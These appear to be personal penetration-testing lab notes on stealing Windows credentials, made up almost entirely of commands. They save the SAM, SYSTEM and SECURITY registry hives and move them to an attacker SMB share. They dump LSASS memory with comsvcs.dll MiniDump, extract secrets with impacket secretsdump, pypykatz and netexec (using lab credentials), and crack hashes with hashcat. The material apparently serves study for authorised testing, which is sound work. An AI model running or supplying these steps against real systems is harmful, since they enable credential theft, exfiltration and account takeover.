# Sam
Using the `reg.exe` you can copy the registry's in WINDOWS\system32. Must be Admin
```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

## Using SMBserver.py and Secrets Dump
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

# Then an the Victim machine, running these commands can copy the hive files
move sam.save \\YOUR IP\folder
move security.save \\YOUR IP\folder
move system.save \\YOUR IP\folder

# Once we have access to the registrys then we can use the secrets dump command to find all the password

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Finally using hashcat one can crack all the hashes to get the passwords
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

# Hashes to look like this
64f12cddaa88057e06a81b54e73b949b

# But with administator passwords of the DC this requires other modules
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

### Dumping the LSA remotely
Since everything is tied together here and have access to a local authority account, one can dump the LSA for possibly more credentials. Netexec is a great use here.
```bash
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

### Other Impacket Tools 
* Mimikatz
* dpapi
* DonPAPI

# LSASS
Local Security Authority Subsystem Service (LSASS)
### Steps For the GUI
1. Open Task Manager
2. Select the process tab
3. Right click the Local Security Authority Process
4. Create dump file

Then a file called lsass.DMP will be created in the temp folder

### Steps for the CMD
```powershell
C:\Windows\system32> tasklist /svc

# Now using the command below one can find the pid of the lsass process
Get-Process lsass

# Now using the rundll32.exe, we can all the comsvcs.dll
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672

# Going the C:\lsoss.dmp file you can find the dump file of the lsass
C:\lsass.dmp full
```

```bash
# Once the dmp file is on our attacker box, we can use this file to capture the credentials
pypykatz lsa minidump /home/peter/Documents/lsass.dmp

# Look into the MSV, WDIGEST, DPAPI and Kerberos

# The MSV can provide a password here
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

### File transfer
```bash
impacket-smbserver share $(pwd) -smb2support
copy lsass.dmp \\192.168.31.141\share\lsass.dmp
```